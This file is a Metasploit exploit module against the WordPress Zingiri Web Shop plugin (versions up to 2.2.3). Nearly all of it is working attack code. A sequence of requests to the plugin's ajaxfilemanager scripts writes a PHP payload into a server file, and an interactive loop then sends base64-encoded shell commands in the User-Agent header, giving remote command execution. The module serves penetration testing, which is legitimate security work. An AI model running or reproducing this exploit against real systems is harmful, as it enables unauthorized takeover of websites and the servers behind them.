##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
require 'msf/core'          
class Metasploit3 < Msf::Exploit::Remote 
	Rank = ExcellentRanking
	include Msf::Exploit::Remote::Tcp     
	include Msf::Exploit::Remote::HttpClient
	def initialize(info = {})
		super(update_info(info,
			'Name'  => ' Wordpress Zingiri Web Shop Plugin <= 2.2.3 Remote Code Execution Exploit ',
			'Description'    => %q{
					This module exploits Remote Code Execution in the Wordpress,
				blogging software which install the Zingiri Web Shop Plugin <=2.2.3 veraion,
			},
			'Author'         => [ 'lukesun629@gmail.com>', 'lukesun629' ],
			'License'        => MSF_LICENSE,
			'Version'        => '',
			'References'     =>
				[
				],
			'Privileged'     => false,
			'Payload'        =>               
				{
					'DisableNops' => true,
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Space'       => 500
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'NOV9 2010',
			'DefaultTarget' => 0))
		register_options(
			[
				OptString.new('URI', [true, "The full URI path to Wordpress", "/"]),
			], self.class)
	end

	def exploit
		url=datastore['URI']
		remotehost = datastore['RHOST']

		res = send_request_cgi({
			'method' => 'GET',
			'uri'	 => "#{url}/wp-content/plugins/zingiri-web-shop/fws/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php",
		})

		directory = res.body.scan(/currentFolderPath" value="([^"]*)"/)
		# puts directory
		code = "selectedDoc[]=#{payload.encoded}&currentFolderPath=#{directory.first.first}"
		res = send_request_cgi({
			'method' => 'POST',
			'uri'	 => "#{url}/wp-content/plugins/zingiri-web-shop/fws/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_file_cut.php",
			'data'	 => "#{code}",
		})

		cookie = res.headers['Set-Cookie'].split(";")
		dirname = Rex::Text.rand_text_alpha(8)
		res = send_request_cgi({
			'method' => 'POST',
			'uri'	 => "#{url}/wp-content/plugins/zingiri-web-shop/fws/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php",
			'data'	 => "new_folder=#{dirname}&currentFolderPath=#{directory.first.first}",
		})
	
		filename = Rex::Text.rand_text_alpha(8)
		res = send_request_cgi({
			'method' => 'POST',
			'uri'	 => "#{url}/wp-content/plugins/zingiri-web-shop/fws/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php",
			'cookie' => "#{cookie[0]}",
			'data'	 => "value=#{filename}&id=#{directory.first.first}#{dirname}",
		})
		
		while(1)
			print "#"
			cmd = gets
			if cmd.include?("exit")
				break
			end
			res = send_request_cgi({
				'method' => 'GET',
				'uri'	 => "#{url}/wp-content/plugins/zingiri-web-shop/fws/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/data.php",
				'agent'	 => "#{Rex::Text.encode_base64("#{cmd}")}\r\n"
			})
			data = res.body.split("_code_")[1]
			puts data.split("<!DOCTYPE")[0]
		end
	end
end

